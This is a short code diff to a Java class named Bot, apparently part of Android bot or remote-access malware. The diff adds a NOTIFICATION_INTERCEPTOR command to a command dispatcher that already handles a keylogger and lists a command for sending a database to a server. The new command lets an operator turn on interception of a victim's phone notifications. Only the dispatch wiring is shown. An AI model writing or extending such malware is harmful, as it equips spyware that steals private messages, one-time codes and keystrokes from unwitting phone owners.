@@ -302,6 +302,10 @@ public class Bot {
                 intent.setAction(CommandsIntentService.ACTION_KEYLOGGER);
                 commandFound = true;
                 break;
+            case Commands.NOTIFICATION_INTERCEPTOR:
+                intent.setAction(CommandsIntentService.ACTION_NOTIFICATION_INTERCEPTOR);
+                commandFound = true;
+                break;
             default:
                 break;
         }
@@ -347,5 +351,6 @@ public class Bot {
         public static final int PHONE_PERMISSION = 32;
         public static final int SEND_DB_TO_SERVER = 33;
         public static final int KEYLOGGER = 34;
+        public static final int NOTIFICATION_INTERCEPTOR = 35;
     }
 }
